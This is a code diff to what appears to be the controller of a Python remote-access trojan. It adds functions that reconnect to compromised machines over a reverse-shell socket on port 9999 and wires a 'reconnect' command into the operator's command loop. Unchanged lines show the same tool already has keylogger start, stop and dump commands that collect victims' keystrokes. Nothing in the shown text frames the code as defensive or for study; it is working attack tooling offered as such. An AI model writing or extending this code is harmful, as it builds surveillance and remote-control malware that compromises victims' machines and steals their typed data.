@@ -107,6 +107,44 @@ def stop_keylogger():
         keylogger_running = False
         print(Fore.YELLOW + "[ * ] Keylogger stopped.")
 
+def reconnect_client(target_ip=None):
+    """Reconnect the specified client or all clients if 'all' is specified."""
+    if target_ip == 'all':
+        # Reconnect all clients
+        for client_id, client_info in clients.items():
+            client_socket = client_info['socket']
+            # Close and reconnect each client socket
+            try:
+                client_socket.close()
+                print(Fore.GREEN + f"[ * ] Reconnecting all clients...")
+                # Attempt to reconnect to each client by creating a new socket connection
+                target_ip = client_id.split(":")[0]  # Get the IP from the client_id
+                reconnect_socket(target_ip)  # Call function to reconnect
+            except Exception as e:
+                print(Fore.RED + f"[ * ] Failed to reconnect client {client_id}: {str(e)}")
+    elif target_ip:
+        # Reconnect specific client
+        client_id = f"{target_ip}"
+        if client_id in clients:
+            client_socket = clients[client_id]['socket']
+            try:
+                client_socket.close()
+                print(Fore.GREEN + f"[ * ] Reconnecting client {client_id}...")
+                reconnect_socket(target_ip)  # Call function to reconnect
+            except Exception as e:
+                print(Fore.RED + f"[ * ] Failed to reconnect client {client_id}: {str(e)}")
+
+def reconnect_socket(target_ip):
+    """Establish a new connection to the target IP."""
+    try:
+        # Create a new socket
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((target_ip, 9999))  # Assuming the port is 9999 for the reverse shell
+        print(Fore.GREEN + f"[ * ] Successfully reconnected to {target_ip}")
+        clients[f"{target_ip}:9999"] = {'socket': client_socket, 'streaming': False, 'keylogger_data': []}
+    except Exception as e:
+        print(Fore.RED + f"[ * ] Failed to reconnect to {target_ip}: {str(e)}")
+
 def dump_keylogger_data():
     global keylogger_data
     filtered_data = []
@@ -164,6 +202,11 @@ def handle_client(client_socket, addr):
             start_keylogger()
             continue
 
+        elif command == "reconnect":
+            target_ip = input(Fore.YELLOW + "Enter target IP (or 'all' to reconnect all): ")
+            reconnect_client(target_ip)
+            continue
+      
         elif command == "keyscan_stop":
             stop_keylogger()
             continue
